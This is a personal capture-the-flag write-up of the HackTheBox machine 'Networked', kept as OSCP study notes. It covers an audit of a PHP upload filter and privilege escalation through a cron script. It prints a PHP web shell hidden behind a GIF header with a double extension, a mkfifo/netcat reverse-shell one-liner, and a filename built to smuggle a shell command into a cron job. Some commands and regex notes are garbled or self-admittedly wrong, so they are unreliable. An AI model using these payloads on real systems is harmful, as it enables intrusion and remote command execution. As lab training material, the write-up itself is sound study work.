# Networked Helped-Through
Name: Networked
Date:  
Difficulty:  Easy
Goals:  OSCP Prep
Learnt:
- Try all alternatives
- alot about PHP
- Level of capability code auditing languages like php and js
- Strengthening an initial linear enumeration methodology for code audit; do this under timed circumstance meant that that which cluttered up and was irrelevant was ignored rather than checked off.

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](OS-ProvingGrounds/Apex/Screenshots/ping.png)
Feroxbuster found a uploads directory
![](ferox.png)

[Nuclei detected a WAF](obsidian://open?vault=CTFs&file=HackTheBox%2FRetired-Machines%2FNetworked%2Fnuclei%2Fwaf-detect-http___10.129.4.156_-apachegeneric) 
![](facemash.png)

![](backupdottar.png)
Decompress the backup.tar
```bash
tar xvf backup.tar
```

## Exploit

It contains backup of the websites code:
![](insidethebackup.png)

photos.php is the php code to display photos on the website; lib.php and upload.php are  vulnerable to malicious file upload
- file_mime_type
[preg_match](https://www.php.net/manual/en/function.preg-match.php) - Perform a regular expression match
[finfo_open](https://www.php.net/manual/en/function.finfo-open.php) - Create a new finfo instance
[is_resource](https://www.php.net/manual/en/function.is-resource.php) - Finds whether a variable is a resource
[move_uploaded_file](https://www.php.net/manual/en/function.move-uploaded-file.php) - Moves an uploaded file to a new location
All scans and enumeration indicates it 5.4.16 php so:
8.1.0 - Returns an [finfo](https://www.php.net/manual/en/class.finfo.php) instance now; previously, a [resource](https://www.php.net/manual/en/language.types.resource.php) was returned.
8.0.3 - `magic_database` is nullable now.
[mime_content_type](https://www.php.net/manual/en/function.mime-content-type.php)

```php
//file must be < 60000 
//filename != 0

//file_mime_type()
$regex = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/'
finfo_open // doesnot go to magic number database! If not specified, the `MAGIC` environment variable is used.

//mime_type must be
image/
//  & /... must be mime_content_type() 

$validext = array('.jpg', '.png', '.gif', '.jpeg')
$mime = $subject

//check_ip does not occur in control flow


//getNameUpload and getnameCheck just alter nameing base on ip with _

function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
	    // "@" prefix, which turns off error reporting for that particular expression.
      $mime = @finfo_file($finfo, $file['tmp_name']); //Content-Type: multipart/form-data
      finfo_close($finfo);
      // if $matches is provided, then it is filled with the results of search.
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
      // is an array &$matches = null,
        $file_type = $matches[1]; 
        return $file_type;
      }
    }
  }
  // mime_content_type Returns the MIME content type for a file as determined by using information from the magic.mime file
  if (function_exists('mime_content_type')) //php 4 >= 4.3, 5, 7,8
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}

function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }
}
```

This is the orginal 
![](originalreq.png)

And the jpg upload to compare.
![](jpguploadlol.png)

Amusing attempt - "Give me  file upload"
![](kalibackgrounduploadattempt.png)

Page source code pull from: "Where is the file upload"
![](whereitisfileupload.png)

This picture...lmao. [Injecting php into jpegs](https://onestepcode.com/injecting-php-code-to-jpg/) vould be possible if the logic on extension filtering allows for .jpg.php or force it to store it as .php. I really want to be regex with sed. I did, but the regex is . And [this THM room that I learnt regex in cli from](https://tryhackme.com/room/catregex) has been dead for last year, going check my old notes. It used this https://regex101.com/.

`'/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/'`
1. `^` matches at beginning of the line 
	1. matches one or more with `+`  chars of  `\-` and a-z all lowercase 
2. Then  matches one or more with `[a-z0-9] and  -.+` with `+`
3. `?` with  `(;\s.+)` match zero or one of the one-character regular expression

https://www.tutorialspoint.com/unix/unix-regular-expressions.htm
https://regex101.com/
https://users.cs.cf.ac.uk/Dave.Marshall/Internet/NEWS/regexp.html

3. Bypass client side mime 
4. Change the mime_content_type 

[Thought to kick off returning to this before all my jokes about php are going to come back a bite me as if someone spiked me with php](https://www.youtube.com/watch?v=GzRfvwo1iNU) Disclaimer my only exposure to PHP is through CTFs.
![1000](modifylegit.png)
...Did not work neither at the jpg or in the photos.php/. ...

1. Filename will be auto changed
2. Cant place the .php inside the other extension
3. Cant append the .php or append php to the .jpegphp

I then tried jhead and put `<?php system($_REQUEST['cmd']); ?>` inside the funny picture stripping the problem down to just making sure the file extension ends up as php. Somehow.

1. add whitespce between the jpg .php - uploaded,but the attachment of extension occurs in lib.php 
1. Cannot move post upload
![](cantmovepostupload.png)
1. Changed myfile; but possible that it results in false positives, but if it is not empty it is automatical changes it back to "myFile"
![](weird.png)

Been another hour and time is precious. I watched the [Ippsec](https://www.youtube.com/watch?v=H3t3G70bakM) video. I am confused as I place the extension inside the other and it replaced it.
![](imgoingmadted.png)

So I researched
[explode](https://www.php.net/manual/en/function.explode.php) - Split a string by a string
[array_shift](https://www.php.net/manual/en/function.array-shift.php) - Shift an element off the beginning of array
[implode](https://www.php.net/manual/en/function.implode.php) - Join array elements with a string
![](itplonksitbackontheend.png)

The extension are being compared to the database.

![](aaaaaaaaaaaaaargh.png)

In conclusion I learnt the level compatency I am under pressure and with a language I do not write code in, but face and am expose to through CTFs. I over thought the problem rather than simplify:
1. Linear parse to understand what it is doing - not its purpose! 
	- Extract functions and describe functionality in one sentence
	- Highlight inline calls, link dependencies
	- Chain testing a hypothetical data test that for significant control flow and data handling - vulnerability basis  
		- This highlights what checks per vulnerabilty 
1.  Error code minor difference make the difference 

```bash
grep -Ri '$_' * # Find Super globals - user interactive
php -a # Interactive php to test code
```

The solution
```php
# nest the file type not append
filename=file.php.gif
# Add content type
Content-Type: application/x-php

# We need to add a mime type and colon
GIF8;<?php system($_REQUEST['cmd']); ?>
```

I  was so close I just did not try the extension the other way around. That check for myself made it into my methodolopgical checks so I really felt think although this seemed from the outset like a massive failure on my part, but really after some thought this was actually a real success. I have found it is the little details that really make or break anything in hacking checks and following and managing the flow of checks and data result from those checks as important in improve success rate.

Amusingly I tried other writeups I felt like my original attempt of appending php to a picture was actual the moethod of [snowscan](https://snowscan.io/htb-writeup-networked/#) top 100 HTB. To mock my own reading to ensure improvement I decide to use this picture as some of the fun of CTF file upload vulnerabilities is funny files to upload.

![](justboomerwithrocketlauncher.png)

![](rocketing.png)

Phpinfo is great for testnig php related vulnerabilities
![](phpinfoisbetterfortesting.png)


## Foothold

Massive overthinking lesson and not trusting original approach, which was valid 
![](hurrayIoverthinkhard.png)

We have multiple escalations to do

## PrivEsc

First we need to escalated to the guly user here is the contents of his directory:
![](gulyuser.png)

Both `check_attack.php` and the `crontab.guly` are linked
![](esconereading.png)


The intended purpose prosummably is to assess the uploads fold for an *attack*. It scans the uploads directory, phps `ls | dir` and [preg_grep](https://www.php.net/manual/en/function.preg-grep.php) - Return array entries that match the pattern. 

A great Room that has finally returned to THM is [Regular Expressions](https://tryhackme.com/room/catregex) I will note this as I failed to do almost a year ago, but was very insightful and open alot of cli horizons. But now I need to better. First recall from memory to tests those wethered neurons

```c
'/find with the forward slashes pattern here/' // other symbols can be used for symbol matching
^ = from beginning?
[] = a regex 
[^.] = anything with a dot
```

Testing results incoming:
```bash
'//' - oblibator correct
^ is exclude - incorrect and incorrect
`[abc]` will match `a`, `b`, and `c` (every occurrence of each letter) - Correct
```

Basically the 1/3, but the the regex here exclude only dot files.

It uses getNameCheck() and check_ip from the lib.php from the backup.tar
![](gncdoesthis.png)
Check_ip()
![](chkip.png)

[w3 php operators](https://www.w3schools.com/php/php_operators.asp) `(!($check[0]))` if is not the 0th then it an attack, you could do if len() != 1 then, it thenm uses [file_put_contents](https://www.php.net/manual/en/function.file-put-contents.php) which I think is vulnerable. And that you could then make it evaluate php code. 
![](flagsforfileputcontents.png)
So it appends data if it exists; lock file open till it has finished writing.

Inifinite lock to prevent log file being remove. 

1. Create an attack.log file in /tmp
2. Make it execute php to trick it to lock the file 
	1. Filename must be not contain dots - listening on localhost?
	2. Or quotes `'`?s

It connects, but breaks if you use `nc -nv` - then a shell without a extension
![](works.png)

The final condition will always run as:
![](codebroke.png)
As if not false is actually false + false
![](alwaywillrun.png)

Check_ip()
![](chkip.png)

Unlike `with x as f:` in python, but like go, c or rust requires close() method to the file so it will never close.
![](flockyou.png)

To refresh:
1. Create an attack.log file in /tmp
1. create a file in uploads
	1. Filename must be not contain dots - listening on localhost?
	2. Or quotes `'`?s
3. we need a second shell to execute the exploitation 

```bash
touch rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc localhost 8089 >/tmp/h'
# remember attack.log is php
touch system
```

![](cantappend.png)
Vim worked so just added a shell there. It did not put my test file name as a message in the attack.log though, waited, test.test.test was gone

![](3minutesisalongtime.png)
Reviewing [snowscan](https://snowscan.io/htb-writeup-networked) I had intially the write idea, but he is injecting the later lines. Once a again I am focusing on the wrong thing like self executing filenames. Where the solution is simply:

```bash
touch 'var/www/html/uploads/; ./tmp/shell'
# would not let create that
```

![](eh.png)

Reset the box as I think it is broken. AAAAAAAAAAAAAAAAAAARGH!